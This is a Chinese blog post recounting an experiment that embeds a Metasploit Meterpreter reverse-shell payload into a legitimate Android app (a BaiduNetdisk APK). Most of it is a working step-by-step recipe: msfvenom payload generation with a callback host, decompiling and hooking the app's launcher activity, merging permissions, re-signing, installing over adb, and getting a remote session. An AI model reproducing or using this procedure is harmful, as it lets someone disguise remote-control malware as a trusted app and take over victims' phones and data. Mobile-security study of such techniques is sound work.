---
layout:     post
title:      Meterpreter之Android APK嵌入攻击实验
date:       2018-12-15
author:     Wh0ale
header-img: img/wallhalla-36EDN6WhY0k.jpg
catalog: true
tags:
    - Meterpreter
    - 移动安全
---


大家有啥更好的apk远控方法可以一块来交流交流
目前我知道的就只有
①DroidJack 不免杀
②SpyNote 不免杀
③CS生成  这个还没试过
④meterpreter嵌入apk

这里我用的的工具是：https://github.com/yoda66/AndroidEmbedIT
用法很简单只有三个参数

在先知上看的那篇文章手动修改apk文件总是出错，我弄了一下午没成功，后面直接就用的这个工具。

总结步骤
1.在“apkmonk.com”或类似的镜像站点上查找现有的有趣APK应用程序。
2.生成Metasploit APK文件。
3.用“apktool”反汇编Metasploit APK文件，以及我们打算修改的APK文件。
4.将所有Meterpreter smali代码复制到新的APK smali目录。
5.通过查找具有以下行的intent-filter，在APK应用程序的AndroidManifest.xml文件中找到代码的入口点 ：
<action android:name="android.intent.action.MAIN"/>
包含此intent-filter的活动名称将是您要搜索的入口点。
6.修改活动“.smali”文件以包含启动Meterpreter阶段的行。
7.将Meterpreter AndroidManifest.xml中的所有Meterpreter权限复制到修改后的APK的- AndroidManifest.xml中。
8.重新组装成DEX压缩格式生成APK。
9.使用“jarsigner”为新创建的APK文件签名，然后将其加载到目标Android设备上。


①.这里我是用的是之前学习移动安全用的diva-beta.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=服务器IP LPORT 9000 -o /tmp/msf.apk

②.我在自己服务器上用meterpreter生成apk

③生成证书
keytool -genkey -v -keystore cowboys.keystore -alias cowboys -keyalg RSA -keysiz e 2048 -validity 10000
输入密钥库口令:
再次输入新口令:
您的名字与姓氏是什么?
​    [Unknown]:  Pentest
您的组织单位名称是什么?
​    [Unknown]:  Myself
您的组织名称是什么?
​    [Unknown]:  Myself
您所在的城市或区域名称是什么?
​    [Unknown]:  BeiJing
您所在的省/市/自治区名称是什么?
​    [Unknown]:  BeiJing
该单位的双字母国家/地区代码是什么?
​    [Unknown]:  CN
CN=Pentest, OU=Myself, O=Myself, L=BeiJing, ST=BeiJing, C=CN是否正确

④安装apk
adb connect 192.168.125.105
adb devices
这里无法上传的原因是之前我就有装过diva-beta.apk
然后顺便一提，这里连接不上adb的原因
命令行输入：adb connect 172.16.4.37:5555 (:5555可省略）
​    提示：unable to connect to 172.16.4.37:5555
​    解决办法：
​    1）手机与PC相连，执行以下命令：adb tcpip 5555
​      成功提示：restarting in TCP mode port 5555
​      如果手机没有和PC连接，直接使用以上命令会提示 error:device not found
​      然后断开USB
​    2）接着执行adb connect 172.16.4.37:5555，这时候应该就能连接成功了
​      成功提示：connected to 172.16.4.37:5555

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehopd3flj20e004ot95.jpg)

⑤使用脚本将msf.apk嵌入正常apk
python3 android_embedit.py -kp cowboys -kn cowboys -ks cowboys.keystore BaiduNetd isk_8.12.7.apk msf.apk
kp 指的是签名密钥
ks 为签名名称
ks 是keystore文件
生成效果大概是这样...我当时忘了截图

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehowxy46j21400cnq4x.jpg)

另外要提的是  当时我本来选定的apk是某云的，后来反编译的时候文件出错，一直没成功，弄了一下午就放弃了

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehp9x7r9j20p30gotay.jpg)

⑥安装apk
adb install final.apk

⑦meterpreter上线

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehpy5dwij20ig0exq4x.jpg)